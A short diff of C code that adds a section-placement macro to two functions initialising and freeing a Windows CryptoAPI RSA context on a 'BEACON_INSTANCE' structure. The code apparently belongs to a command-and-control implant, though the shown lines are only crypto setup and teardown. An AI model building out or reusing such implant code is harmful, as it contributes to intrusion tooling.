@@ -17,7 +17,7 @@
  * Creates a key object for RSA
  *
 -*/
-BOOL CryptRsaInit( PBEACON_INSTANCE Ins )
+DEFINESEC(B) BOOL CryptRsaInit( PBEACON_INSTANCE Ins )
 {
 	if ( Ins->api.CryptAcquireContextA( &Ins->key[0].Provider, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT | CRYPT_SILENT ) )
 	{
@@ -39,7 +39,7 @@ BOOL CryptRsaInit( PBEACON_INSTANCE Ins )
  * Free's the associated keys for RSA
  *
 -*/
-VOID CryptRsaFree( PBEACON_INSTANCE Ins )
+DEFINESEC(B) VOID CryptRsaFree( PBEACON_INSTANCE Ins )
 {
 	Ins->api.CryptDestroyKey( Ins->key[0].Key );
 	Ins->api.CryptReleaseContext( Ins->key[0].Provider, 0 );
